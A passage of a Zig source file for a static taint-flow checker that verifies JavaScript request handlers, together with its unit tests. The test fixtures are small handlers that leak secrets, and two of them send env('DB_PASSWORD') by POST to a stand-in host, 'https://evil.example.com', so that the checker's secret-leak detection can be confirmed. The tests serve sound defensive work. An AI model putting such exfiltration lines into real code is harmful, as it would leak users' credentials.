                const right = self.pushConditionConstraints(bin.right, want_negation);
                return left + right;
            }
        }

        const raw = self.extractCondConstraint(cond) orelse return 0;
        const final = if (want_negation) counterexample.negate(raw) orelse return 0 else raw;
        self.working_constraints.append(self.allocator, final) catch {
            self.markAllocationFailure();
            return 0;
        };
        return 1;
    }

    fn popConstraints(self: *FlowChecker, count: usize) void {
        var remaining = count;
        while (remaining > 0) : (remaining -= 1) _ = self.working_constraints.pop();
    }

    /// Record a virtual-module call on the current path, if `vd.init` is a
    /// direct call to an imported module function. Also remembers the
    /// originating module-function slot on the declared binding so that
    /// later `if (x)` patterns can emit stub_truthy.
    fn trackModuleCallInit(self: *FlowChecker, vd: Node.VarDecl) void {
        if (self.walking_module_level) return;
        const init_tag = self.ir_view.getTag(vd.init) orelse return;
        if (init_tag != .call) return;
        const call = self.ir_view.getCall(vd.init) orelse return;
        const callee_tag = self.ir_view.getTag(call.callee) orelse return;
        if (callee_tag != .identifier) return;
        const binding = self.bindingAt(call.callee) orelse return;
        const meta = self.module_fn_meta.get(binding.slot) orelse return;
        const call_index = self.working_io_calls.items.len;
        self.working_io_calls.append(self.allocator, .{
            .module = meta.module,
            .func = meta.func,
            .returns = meta.returns,
        }) catch {
            self.markAllocationFailure();
            return;
        };
        var call_meta = meta;
        call_meta.call_index = @intCast(call_index);
        const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
        self.binding_origin.put(self.allocator, key, call_meta) catch self.markAllocationFailure();
    }

    fn findNegatedAndConstraint(
        self: *FlowChecker,
        cond: NodeIndex,
        prefer_request: bool,
    ) ?counterexample.WitnessConstraint {
        const tag = self.ir_view.getTag(cond) orelse return null;
        if (tag == .binary_op) {
            const bin = self.ir_view.getBinary(cond) orelse return null;
            if (bin.op == .and_op) {
                return self.findNegatedAndConstraint(bin.left, prefer_request) orelse
                    self.findNegatedAndConstraint(bin.right, prefer_request);
            }
        }

        const raw = self.extractCondConstraint(cond) orelse return null;
        const negated = counterexample.negate(raw) orelse return null;
        if (prefer_request and !isRequestConstraint(negated)) return null;
        return negated;
    }

    fn isRequestConstraint(c: counterexample.WitnessConstraint) bool {
        return switch (c) {
            .req_method, .req_method_not, .req_url, .req_url_not => true,
            // exhaustive: the remaining witness constraints do not describe
            // request fields. False affects witness choice, not the verdict.
            else => false,
        };
    }

    /// Extract a single WitnessConstraint from a condition node. AND
    /// chains are handled one level up in `pushConditionConstraints`;
    /// supported single-node shapes are documented by the switch arms.
    fn extractCondConstraint(self: *FlowChecker, cond: NodeIndex) ?counterexample.WitnessConstraint {
        const tag = self.ir_view.getTag(cond) orelse return null;
        switch (tag) {
            .identifier => {
                const binding = self.bindingAt(cond) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                const meta = self.binding_origin.get(key) orelse return null;
                if (meta.returns != .boolean) return null;
                return .{ .stub_truthy = .{
                    .module = meta.module,
                    .func = meta.func,
                    .returns = meta.returns,
                    .call_index = meta.call_index,
                } };
            },
            .unary_op => {
                const unary = self.ir_view.getUnary(cond) orelse return null;
                if (unary.op != .not) return null;
                const inner = self.extractCondConstraint(unary.operand) orelse return null;
                return counterexample.negate(inner);
            },
            .binary_op => {
                const bin = self.ir_view.getBinary(cond) orelse return null;
                if (bin.op != .strict_eq and bin.op != .strict_neq) return null;

                const raw = self.extractLiteralReqComparison(bin.left, bin.right) orelse
                    self.extractLiteralReqComparison(bin.right, bin.left) orelse
                    self.extractOptionalAbsentComparison(bin.left, bin.right) orelse
                    self.extractOptionalAbsentComparison(bin.right, bin.left) orelse
                    return null;
                return if (bin.op == .strict_eq) raw else counterexample.negate(raw);
            },
            .member_access => {
                return self.extractResultOkConstraint(cond);
            },
            // exhaustive: null means no path constraint could be read from this
            // condition. Constraints only sharpen a counterexample witness; a
            // missing one makes the witness less specific and never decides
            // whether a diagnostic fires.
            else => return null,
        }
    }

    /// Recognise `req.method === "POST"` / `req.url === "/path"` shapes
    /// (either direction). Handles only direct property access on the
    /// request binding; `const method = req.method` indirection would
    /// need a second binding_origin track and is a follow-up.
    fn extractLiteralReqComparison(
        self: *FlowChecker,
        prop_node: NodeIndex,
        lit_node: NodeIndex,
    ) ?counterexample.WitnessConstraint {
        const lit_tag = self.ir_view.getTag(lit_node) orelse return null;
        if (lit_tag != .lit_string) return null;
        const str_idx = self.ir_view.getStringIdx(lit_node) orelse return null;
        const value = self.ir_view.getString(str_idx) orelse return null;

        if (self.isReqProperty(prop_node, "method")) {
            return .{ .req_method = value };
        }
        if (self.isReqProperty(prop_node, "url") or self.isReqProperty(prop_node, "path")) {
            return .{ .req_url = value };
        }
        return null;
    }

    /// Recognise `value === undefined` where value was produced by an
    /// optional-returning module call. The equality branch needs an absent
    /// stub; the caller negates it for `!==`.
    fn extractOptionalAbsentComparison(
        self: *FlowChecker,
        value_node: NodeIndex,
        undefined_node: NodeIndex,
    ) ?counterexample.WitnessConstraint {
        if (self.ir_view.getTag(value_node) != .identifier or
            self.ir_view.getTag(undefined_node) != .lit_undefined)
        {
            return null;
        }
        const binding = self.bindingAt(value_node) orelse return null;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const meta = self.binding_origin.get(key) orelse return null;
        switch (meta.returns) {
            .optional_string, .optional_object, .optional_number => {},
            .boolean,
            .number,
            .string,
            .object,
            .undefined,
            .unknown,
            .result,
            .dict,
            .bytes,
            => return null,
        }
        return .{ .stub_falsy = .{
            .module = meta.module,
            .func = meta.func,
            .returns = meta.returns,
            .call_index = meta.call_index,
        } };
    }

    /// Recognise `result.ok` where `result` is an identifier bound to a
    /// Result-returning module call (validateJson, jwtVerify, etc.).
    fn extractResultOkConstraint(
        self: *FlowChecker,
        member_node: NodeIndex,
    ) ?counterexample.WitnessConstraint {
        const member = self.ir_view.getMember(member_node) orelse return null;
        const prop_name = self.resolveAtomName(member.property) orelse return null;
        if (!std.mem.eql(u8, prop_name, "ok")) return null;

        const obj_tag = self.ir_view.getTag(member.object) orelse return null;
        if (obj_tag != .identifier) return null;
        const binding = self.bindingAt(member.object) orelse return null;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const meta = self.binding_origin.get(key) orelse return null;
        if (meta.returns != .result) return null;

        return .{ .result_ok = .{
            .module = meta.module,
            .func = meta.func,
            .returns = meta.returns,
            .call_index = meta.call_index,
        } };
    }

    fn resolveAtomName(self: *const FlowChecker, atom_idx: u16) ?[]const u8 {
        if (self.atoms) |table| {
            const atom: object.Atom = @enumFromInt(atom_idx);
            if (atom.toPredefinedName()) |name| return name;
            return table.getName(atom);
        }
        if (self.ir_view.getString(atom_idx)) |name| return name;
        const atom: object.Atom = @enumFromInt(atom_idx);
        return atom.toPredefinedName();
    }

    fn markAllocationFailure(self: *FlowChecker) void {
        self.allocation_failed = true;
    }
};

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

test "FlowChecker fails closed when taint state cannot allocate" {
    const allocator = std.testing.allocator;
    const source = "function handler(req) { return Response.json(req); }";
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    defer parser.deinit();
    const root = try parser.parse();
    const view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(view, root) orelse
        return error.HandlerNotFound;

    var failing = std.testing.FailingAllocator.init(allocator, .{ .fail_index = 0 });
    var checker = FlowChecker.init(failing.allocator(), view, null);
    defer checker.deinit();
    try std.testing.expectError(error.OutOfMemory, checker.check(handler_fn));
}

test "FlowChecker fails closed when diagnostic storage cannot allocate" {
    const allocator = std.testing.allocator;
    const source = "function handler() { return Response.json({ ok: true }); }";
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    defer parser.deinit();
    const root = try parser.parse();
    const view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(view, root) orelse
        return error.HandlerNotFound;

    var failing = std.testing.FailingAllocator.init(allocator, .{ .fail_index = 0 });
    var checker = FlowChecker.init(failing.allocator(), view, null);
    defer checker.deinit();
    checker.addDiagnostic(.{
        .severity = .err,
        .kind = .secret_in_response,
        .node = handler_fn,
        .message = "forced diagnostic",
        .help = null,
    });
    try std.testing.expectError(error.OutOfMemory, checker.check(handler_fn));
}

fn expectExportedSecretLabels(
    allocator: std.mem.Allocator,
    view: IrView,
    atoms: *atom_table.AtomTable,
) !void {
    var checker = FlowChecker.init(allocator, view, atoms);
    defer checker.deinit();

    const labels = (try checker.exportedReturnLabels("encodeKey")) orelse
        return error.ExportNotFound;
    try std.testing.expect(labels.has(.secret));
}

test "exported return labels propagate allocation failure" {
    const source =
        \\import { env } from "zttp:env";
        \\import { urlEncode } from "zttp:url";
        \\export function encodeKey() { return urlEncode(env("SECRET_KEY")); }
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(std.testing.allocator, source);
    var atoms = atom_table.AtomTable.init(std.testing.allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    _ = try parser.parse();
    const view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    try std.testing.checkAllAllocationFailures(
        std.testing.allocator,
        expectExportedSecretLabels,
        .{ view, &atoms },
    );
}

test "FlowChecker captures witness constraints on secret-in-response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret !== undefined) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    // Expect exactly one secret-in-response diagnostic, carrying a
    // stub_truthy constraint on the present env value and a tracked env I/O call.
    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        try std.testing.expectEqual(
            counterexample.PropertyTag.no_secret_leakage,
            propertyTagForKind(d.kind).?,
        );
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .stub_truthy);
        try std.testing.expectEqualStrings("env", w.path_constraints[0].stub_truthy.func);
        try std.testing.expect(w.io_calls.len >= 1);
        try std.testing.expectEqualStrings("env", w.io_calls[0].func);
    }
    try std.testing.expect(found);
}

test "FlowChecker does not leak sibling-branch I/O calls into the witness" {
    // If a module call happens inside the branch that does NOT reach the
    // sink, the fall-through sink's witness must not include it - otherwise
    // the synthesised stub sequence would drive the handler down the wrong
    // path. Regression test for the shrinkRetainingCapacity fix around
    // `.if_stmt` in walkStmt.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret === undefined) {
        \\    const cached = cacheGet("sibling");
        \\    return Response.json({ ok: cached });
        \\  }
        \\  return Response.json({ leaked: secret });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        for (w.io_calls) |call| {
            // `cacheGet` is only called on the sibling branch that returns
            // without leaking. It must not appear in this witness.
            try std.testing.expect(!std.mem.eql(u8, call.func, "cacheGet"));
        }
    }
    try std.testing.expect(found);
}

test "FlowChecker captures stub_truthy on if-else with absent condition" {
    // `if (secret === undefined) { ok } else { leak }` - the else branch's
    // effective constraint requires a present secret value.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret === undefined) {
        \\    return Response.json({ ok: true });
        \\  } else {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .stub_truthy);
        try std.testing.expectEqualStrings("env", w.path_constraints[0].stub_truthy.func);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures req_method constraint from literal comparison" {
    // `if (req.method === "POST") { leak }` - the witness request must be
    // POST, not the default GET, so the handler reaches the sink.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "POST") {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .req_method);
        try std.testing.expectEqualStrings("POST", w.path_constraints[0].req_method);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures AND chain as multiple constraints" {
    // `if (req.method === "POST" && secret !== undefined) { leak }` produces
    // TWO constraints: the method literal and env presence. The solver turns
    // this into a POST request whose env stub returns a value.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "POST" && secret !== undefined) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 2), w.path_constraints.len);

        var saw_method = false;
        var saw_truthy = false;
        for (w.path_constraints) |c| {
            switch (c) {
                .req_method => |m| {
                    try std.testing.expectEqualStrings("POST", m);
                    saw_method = true;
                },
                .stub_truthy => |info| {
                    try std.testing.expectEqualStrings("env", info.func);
                    saw_truthy = true;
                },
                else => return error.UnexpectedConstraintKind,
            }
        }
        try std.testing.expect(saw_method and saw_truthy);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures one concrete negated request constraint for else AND path" {
    // `!(req.method === "GET" && secret !== undefined)` should use one concrete false
    // clause. Pick a non-GET method and leave the env call on its default
    // truthy stub so replay still leaks the sentinel secret.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "GET" && secret !== undefined) {
        \\    return Response.json({ ok: true });
        \\  } else {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .req_method_not);
        try std.testing.expectEqualStrings("GET", w.path_constraints[0].req_method_not);

        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);

        try std.testing.expectEqualStrings("POST", witness.request.method);
        try std.testing.expectEqual(@as(usize, 1), witness.io_stubs.len);
        try std.testing.expectEqualStrings("\"secret-sentinel\"", witness.io_stubs[0].result_json);
    }
    try std.testing.expect(found);
}

test "FlowChecker keeps repeated module call constraints tied to call index" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const a = env("SECRET_A");
        \\  const b = env("SECRET_B");
        \\  if (a !== undefined) {
        \\    if (b === undefined) {
        \\      return Response.json({ leaked: a });
        \\    }
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 2), w.io_calls.len);

        var saw_a_truthy = false;
        var saw_b_falsy = false;
        for (w.path_constraints) |c| {
            switch (c) {
                .stub_truthy => |info| {
                    try std.testing.expectEqual(@as(?u32, 0), info.call_index);
                    saw_a_truthy = true;
                },
                .stub_falsy => |info| {
                    try std.testing.expectEqual(@as(?u32, 1), info.call_index);
                    saw_b_falsy = true;
                },
                else => return error.UnexpectedConstraintKind,
            }
        }
        try std.testing.expect(saw_a_truthy and saw_b_falsy);

        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);

        try std.testing.expectEqualStrings("\"secret-sentinel\"", witness.io_stubs[0].result_json);
        try std.testing.expectEqualStrings("null", witness.io_stubs[1].result_json);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures result_ok constraint on validated path" {
    // `if (r.ok) { leak(env()) }` - the witness must make validateJson
    // return an ok Result so the sink is reachable.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\import { validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const r = validateJson(0, "{}");
        \\  if (r.ok) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        var saw_result_ok = false;
        for (w.path_constraints) |c| {
            if (c == .result_ok) {
                try std.testing.expectEqualStrings("validateJson", c.result_ok.func);
                saw_result_ok = true;
            }
        }
        try std.testing.expect(saw_result_ok);
    }
    try std.testing.expect(found);
}

test "FlowChecker records validated defended path reaching egress body" {
    const allocator = std.testing.allocator;
    const source =
        \\import { validateObject } from "zttp:validate";
        \\function handler(req) {
        \\  const v = validateObject(req.body, "{}");
        \\  fetchSync("https://api.example.com", { method: "POST", body: v.value });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw_injection = false;
    var saw_input_validated = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .injection_safe) {
            saw_injection = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expect(d.guard_func != null);
            try std.testing.expectEqualStrings("validateObject", d.guard_func.?);
        }
        if (d.property == .input_validated) saw_input_validated = true;
    }
    try std.testing.expect(saw_injection);
    try std.testing.expect(saw_input_validated);
    // The property itself must actually hold for the card to render.
    try std.testing.expect(checker.getProperties().injection_safe);
}

test "FlowChecker flags a secret reaching a module fetch body" {
    // Regression: the egress sink check recognized only the bare `fetchSync`
    // global, so a secret sent via the documented `zttp:fetch` API was not
    // flagged and no_secret_leakage was falsely proven.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("DB_PASSWORD");
        \\  fetch("https://evil.example.com", { method: "POST", body: secret });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching a var-bound module fetch body" {
    // Regression (#11): the egress sink check ran only on bare-statement calls
    // (.expr_stmt / .call), so binding the fetch result -- the dominant idiom,
    // `const r = fetch(url, { body: secret })` -- bypassed the check entirely
    // and falsely proved no_secret_leakage. The .var_decl arm now sink-checks
    // its initializer too.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("DB_PASSWORD");
        \\  const r = fetch("https://evil.example.com", { method: "POST", body: secret });
        \\  return Response.json({ ok: r.ok });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching a module fetch query field" {
    // Regression: the new `query` init field is appended to the egress URL at
    // runtime, but inferObjectBodyLabels returned only the `body` value when a
    // body key was present, so a secret in `query` escaped every sink check and
    // no_secret_leakage was falsely proven and signed into the attestation.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("UPSTREAM_KEY");
        \\  fetch("https://api.example.com/v1", { method: "POST", body: "hello", query: { key: secret } });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching egress via an options spread" {
    // Regression: a secret carried into the options object through an object
    // spread (`...{ query: { key: secret } }`) was invisible to the per-field
    // body/query/headers extractors, so it escaped every egress sink and
    // no_secret_leakage was falsely proven. The `body:` early return made it
    // worse by short-circuiting the whole-object fallback.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("UPSTREAM_KEY");
        \\  fetch("https://api.example.com/v1", { body: "hello", ...{ query: { key: secret } } });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker proves no_secret_leakage for a benign module fetch" {
    // Negative control for the fix above: a module fetch carrying no secret
    // must still discharge no_secret_leakage (no false positive).
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  fetch("https://api.example.com", { method: "POST", body: "hello" });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(checker.getProperties().no_secret_leakage);
}

test "FlowChecker keeps a secret passed through toolInput in its parsed value" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\import { toolInput } from "zttp:tool";
        \\function handler(req) {
        \\  const parsed = toolInput("Input", { body: env("SECRET_KEY") });
        \\  return Response.json(parsed.value);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

